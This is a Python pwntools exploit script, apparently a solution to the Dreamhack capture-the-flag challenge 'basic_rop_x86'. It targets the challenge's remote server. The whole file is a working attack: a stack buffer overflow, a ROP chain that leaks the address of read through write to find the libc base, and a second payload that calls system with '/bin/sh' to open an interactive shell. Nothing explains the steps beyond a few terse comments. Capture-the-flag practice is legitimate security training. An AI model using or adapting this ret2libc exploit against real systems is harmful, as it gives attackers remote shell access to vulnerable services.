from pwn import *
#p = process('./basic_rop_x86')
p = remote('host3.dreamhack.games', 22952)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')
r = ROP(e)

write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
read_got = e.got['read']
pop_ebp = r.find_gadget(['pop ebp', 'ret'])[0]
pop_esi_r15 = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]

system_offset = libc.symbols['system']
read_offset = libc.symbols['read']

sh_offset = list(libc.search(b"/bin/sh"))[0]

main = e.symbols['main']

payload = b'a' * 0x40 + b'b' *0x8
#write(1, read_got, ...)
payload += p32(write_plt)
payload += p32(pop_esi_r15) + p32(1)
payload += p32(read_got) + p32(4)
payload += p32(main)


p.send(payload)
p.recvuntil(b'a'*0x40)
r_read = u32(p.recvn(4))
libc_base = r_read - read_offset
system = libc_base + system_offset 
binsh = libc_base + sh_offset

payload = b'a'*0x40 + b'b'*0x8
payload += p32(system)
payload += p32(pop_ebp)
payload += p32(binsh)

p.send(payload)
p.interactive()